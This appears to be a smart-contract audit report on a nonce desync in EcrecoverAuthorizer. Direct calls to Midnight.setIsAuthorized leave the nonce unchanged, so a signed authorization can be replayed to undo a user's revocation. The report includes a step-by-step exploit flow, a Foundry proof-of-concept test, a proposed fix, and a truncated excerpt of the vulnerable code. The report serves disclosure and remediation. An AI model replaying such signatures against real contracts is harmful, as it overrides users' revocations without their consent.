### Title
EcrecoverAuthorizer Nonce Desync Allows Signed Authorization Replay After Direct Midnight.setIsAuthorized Call - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer` maintains its own `nonce` mapping that is only incremented when `EcrecoverAuthorizer.setIsAuthorized` is called. Because `Midnight.setIsAuthorized` is independently callable by any authorized operator, a direct call to it never touches `EcrecoverAuthorizer.nonce`, leaving any pending signed message at nonce N permanently valid until its deadline. This allows a signed authorization to be submitted to `EcrecoverAuthorizer` after Alice has already revoked the intended state change, silently undoing her revocation.

### Finding Description

**Code path — `Midnight.setIsAuthorized`:** [1](#0-0) 

The only guard is `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. If Bob holds `isAuthorized[alice][bob] == true`, he can call `Midnight.setIsAuthorized(charlie, true, alice)` directly. This writes to `isAuthorized[alice][charlie]` and emits an event, but never touches `EcrecoverAuthorizer.nonce[alice]`.

**Code path — `EcrecoverAuthorizer.setIsAuthorized`:** [2](#0-1) 

The nonce check on line 26 (`authorization.nonce == nonce[authorization.authorizer]++`) is the sole replay guard. It is only incremented here, inside `EcrecoverAuthorizer`. There is no callback, hook, or shared counter that `Midnight.setIsAuthorized` could increment.

**Exploit flow:**

1. Alice signs `Authorization{authorizer: alice, authorized: charlie, isAuthorized: true, nonce: 0, deadline: T}` and hands it to Bob.
2. Bob calls `Midnight.setIsAuthorized(charlie, true, alice)` directly (bypassing `EcrecoverAuthorizer`). `isAuthorized[alice][charlie]` becomes `true`; `EcrecoverAuthorizer.nonce[alice]` remains `0`.
3. Alice decides to revoke Charlie and calls `Midnight.setIsAuthorized(charlie, false, alice)` directly. `isAuthorized[alice][charlie]` becomes `false`; nonce still `0`.
4. Anyone submits Alice's original signed message to `EcrecoverAuthorizer.setIsAuthorized`. All checks pass: deadline ≤ T (still valid), `authorization.nonce (0) == nonce[alice] (0)` ✓, `ecrecover` returns Alice ✓, `signer == authorization.authorizer` ✓. The call succeeds, sets `isAuthorized[alice][charlie] = true` again, and increments the nonce to `1`.

Alice's explicit revocation is silently undone. She has no on-chain mechanism to invalidate the pending signed message short of submitting it herself first.

**Why existing checks fail:**

The `InvalidNonce` guard in `EcrecoverAuthorizer` only prevents re-submission *through `EcrecoverAuthorizer` itself*. It has no awareness of the authorization state in `Midnight`, so a direct-path state change leaves the nonce counter frozen at N, keeping the signed message live. [3](#0-2) 

### Impact Explanation
An authorized operator (Bob) can bypass `EcrecoverAuthorizer` to effect the same authorization change Alice signed, leaving her signed message unconsumed. If Alice subsequently revokes that change via `Midnight.setIsAuthorized`, any party in possession of the original signature can replay it through `EcrecoverAuthorizer` to re-authorize (or re-deauthorize) Charlie without Alice's knowledge or consent, violating the invariant that a signed authorization message is consumed exactly once.

### Likelihood Explanation
Preconditions: (1) Alice has a pending signed `EcrecoverAuthorizer` authorization at nonce N with a future deadline; (2) Bob is already authorized by Alice in `Midnight`; (3) Bob calls `Midnight.setIsAuthorized` directly instead of submitting Alice's signature. Step (3) is a normal, permitted operation — nothing prevents it. After Alice revokes, the window for replay is open until `authorization.deadline` expires. The scenario is repeatable for every nonce cycle where a direct call precedes a revocation.

### Recommendation
Add a nonce-invalidation function to `EcrecoverAuthorizer` that lets Alice (or any address authorized by Alice in `Midnight`) increment `nonce[alice]` without executing a state change, consuming any pending signed message:

```solidity
function invalidateNonce(address authorizer) external {
    require(
        authorizer == msg.sender ||
        IMidnight(MIDNIGHT).isAuthorized(authorizer, msg.sender),
        Unauthorized()
    );
    nonce[authorizer]++;
    emit NonceInvalidated(msg.sender, authorizer, nonce[authorizer]);
}
```

This mirrors the pattern used by EIP-2612 permit implementations and gives Alice a direct escape hatch. Alternatively, document prominently that direct calls to `Midnight.setIsAuthorized` do not consume pending `EcrecoverAuthorizer` signatures, and that users must call `invalidateNonce` (or submit the signed message themselves) before revoking via the direct path.

### Proof of Concept

```solidity
function testNonceDesyncReplay() public {
    // Setup: Alice authorizes EcrecoverAuthorizer and Bob
    vm.startPrank(alice);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, alice);
    midnight.setIsAuthorized(bob, true, alice);
    vm.stopPrank();

    // Alice signs {charlie, true, nonce: 0}
    Authorization memory auth = Authorization({
        authorizer: alice,
        authorized: charlie,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory sig = signAuthorization(auth, alice);

    // Step 1: Bob calls Midnight.setIsAuthorized directly (bypasses EcrecoverAuthorizer)
    vm.prank(bob);
    midnight.setIsAuthorized(charlie, true, alice);

    // Assert: nonce in EcrecoverAuthorizer is still 0
    assertEq(ecrecoverAuthorizer.nonce(alice), 0);
    assertEq(midnight.isAuthorized(alice, charlie), true);

    // Step 2: Alice revokes Charlie directly
    vm.prank(alice);
    midnight.setIsAuthorized(charlie, false, alice);
    assertEq(midnight.isAuthorized(alice, charlie), false);
    assertEq(ecrecoverAuthorizer.nonce(alice), 0); // still 0

    // Step 3: Anyone replays Alice's signed message — succeeds, undoing revocation
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assertions: replay succeeded, Charlie re-authorized without Alice's consent
    assertEq(ecrecoverAuthorizer.nonce(alice), 1);
    assertEq(midnight.isAuthorized(alice, charlie), true); // revocation undone
}
```

Expected: all assertions pass, demonstrating that Alice's revocation is silently undone by replaying the unconsumed signed message.

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
